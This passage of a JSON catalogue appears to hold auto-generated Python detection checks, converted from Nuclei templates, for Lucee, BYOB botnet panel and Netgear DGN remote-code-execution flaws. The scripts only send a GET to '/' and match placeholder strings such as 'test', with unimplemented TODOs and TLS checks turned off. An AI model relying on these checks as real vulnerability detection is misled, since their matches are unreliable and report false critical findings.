checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "landray",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_lucee_rce",
        "name": "Lucee < 6.0.1.59 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body, \"{{randstr}}\"); contains(header, \"cfid\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: lucee-rce\nName: Lucee < 6.0.1.59 - Remote Code Execution\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_lucee_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"lucee-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Lucee < 6.0.1.59 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"{{randstr}}\"); contains(header, \"cfid\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Lucee < 6.0.1.59 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_lucee_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: lucee-rce\nName: Lucee < 6.0.1.59 - Remote Code Execution\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_lucee_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"lucee-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Lucee < 6.0.1.59 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"{{randstr}}\"); contains(header, \"cfid\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Lucee < 6.0.1.59 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_lucee_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "lucee",
          "rce",
          "oast",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_malwared_byob_rce",
        "name": "Malwared BYOB - Unauthenticated Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Malwared BYOB - Unauthenticated RCE allows remote code execution.",
        "severity": "critical",
        "detection": "[OR] mot(s) 'Build Your Own Botnet, Post-Exploitation Framework, malwaredllc/byob' / [AND] status HTTP [200] | mot(s) 'buildyourownbotnet/database.db'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: malwared-byob-rce\nName: Malwared BYOB - Unauthenticated Remote Code Execution\nSeverity: critical\nDescription: Malwared BYOB - Unauthenticated RCE allows remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_malwared_byob_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"malwared-byob-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Malwared BYOB - Unauthenticated Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'Build Your Own Botnet, Post-Exploitation Framework, malwaredllc/byob' / [AND] status HTTP [200] | mot(s) 'buildyourownbotnet/database.db'\"\n\n        # Simple word matcher simulation\n        matchers = ['Build Your Own Botnet, Post-Exploitation Framework, malwaredllc/byob', 'buildyourownbotnet/database.db']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Malwared BYOB - Unauthenticated Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_malwared_byob_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: malwared-byob-rce\nName: Malwared BYOB - Unauthenticated Remote Code Execution\nSeverity: critical\nDescription: Malwared BYOB - Unauthenticated RCE allows remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_malwared_byob_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"malwared-byob-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Malwared BYOB - Unauthenticated Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'Build Your Own Botnet, Post-Exploitation Framework, malwaredllc/byob' / [AND] status HTTP [200] | mot(s) 'buildyourownbotnet/database.db'\"\n\n        # Simple word matcher simulation\n        matchers = ['Build Your Own Botnet, Post-Exploitation Framework, malwaredllc/byob', 'buildyourownbotnet/database.db']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Malwared BYOB - Unauthenticated Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_malwared_byob_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "malware",
          "byob",
          "botnet",
          "oss",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_netgear_dgn_rce",
        "name": "Netgear DGN Devices - Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "This template checks for unauthenticated command execution vulnerability in Netgear DGN devices. Attackers can bypass authentication mechanisms and execute arbitrary commands with root privileges.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body, '{{randstr}}'); !contains(body, 'echo {{randstr}}')",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netgear-dgn-rce\nName: Netgear DGN Devices - Command Execution\nSeverity: critical\nDescription: This template checks for unauthenticated command execution vulnerability in Netgear DGN devices. Attackers can bypass authentication mechanisms and execute arbitrary commands with root privileges.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netgear_dgn_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netgear-dgn-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Netgear DGN Devices - Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(body, '{{randstr}}'); !contains(body, 'echo {{randstr}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr}}', 'echo {{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Netgear DGN Devices - Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netgear_dgn_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
